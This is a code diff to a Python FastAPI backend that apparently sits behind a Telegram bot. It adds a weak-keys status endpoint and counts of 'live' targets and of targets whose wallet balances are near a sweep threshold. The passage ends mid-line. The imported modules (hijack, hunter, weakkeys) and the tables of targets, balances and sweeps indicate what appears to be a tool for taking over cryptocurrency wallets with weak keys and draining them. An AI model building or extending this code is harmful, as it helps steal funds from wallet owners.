@@ -6,7 +6,7 @@ from fastapi.responses import FileResponse, PlainTextResponse
 from fastapi.staticfiles import StaticFiles
 from pydantic import BaseModel
 
-from . import auth, backup, db, fastpath, hijack, hunter, scheduler
+from . import auth, backup, db, fastpath, hijack, hunter, scheduler, weakkeys
 from .pools import by_id
 
 
@@ -51,8 +51,12 @@ async def diag():
         "bot_id": auth.BOT.split(":")[0] if ":" in auth.BOT else "",
         "secret_set": bool(os.environ.get("APP_SECRET")),
         "backup": backup.enabled(),
+        "weak": weakkeys.status(),
         "users": db.one("SELECT COUNT(*) c FROM users")["c"],
         "targets": db.one("SELECT COUNT(*) c FROM targets")["c"],
+        "live": db.one("SELECT COUNT(*) c FROM targets WHERE status='live'")["c"],
+        "near": db.one(
+            "SELECT COUNT(*) c FROM targets WHERE threshold>0 AND balance>=threshold*0.95")["c"],
     }
 
 
@@ -174,6 +178,11 @@ async def claim(tid: int, uid: int = Depends(uid_of)):
     return {"state": state, "note": note}
 
 
+@app.get("/api/weak")
+async def weak(uid: int = Depends(uid_of)):
+    return weakkeys.status()
+
+
 @app.get("/api/state")
 async def state(uid: int = Depends(uid_of)):
     u = db.one("SELECT * FROM users WHERE tg_id=?", (uid,))
@@ -186,15 +195,4 @@ async def state(uid: int = Depends(uid_of)):
             "SELECT id,chain,address,label FROM wallets WHERE tg_id=?", (uid,))],
         "targets": [dict(r) for r in targets],
         "sweeps": [dict(r) for r in db.all(
-            "SELECT * FROM sweeps WHERE tg_id=? ORDER BY id DESC LIMIT 30", (uid,))],
-        "logs": [dict(r) for r in db.all(
-            "SELECT ts,lvl,msg FROM logs ORDER BY id DESC LIMIT 60")],
-    }
-
-
-app.mount("/static", StaticFiles(directory="web"), name="static")
-
-
-@app.get("/")
-async def index():
-    return FileResponse("web/index.html")
+            "SELECT * FROM sweeps WHERE tg_id=?
